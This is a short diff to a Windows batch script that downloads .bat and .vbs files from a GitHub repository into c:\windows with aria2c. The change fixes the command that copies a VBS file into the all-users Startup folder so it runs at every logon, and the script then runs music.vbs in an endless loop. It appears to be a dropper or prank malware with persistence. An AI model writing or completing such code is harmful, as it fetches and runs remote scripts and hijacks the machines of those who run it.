@@ -36,7 +36,7 @@ move music.vbs c:\windows\music.vbs
 c:\windows\aria2c.exe https://github.com/JamieJiami/Aria2c/raw/main/startup.bat
 move startup.bat c:\windows\startup.bat
 c:\windows\aria2c.exe https://github.com/JamieJiami/Aria2c/raw/main/statup.vbs
-move statup"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\startup.vbs"
+move statup.vbs "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\startup.vbs"
 :1
 c:\windows\music.vbs
 goto 1
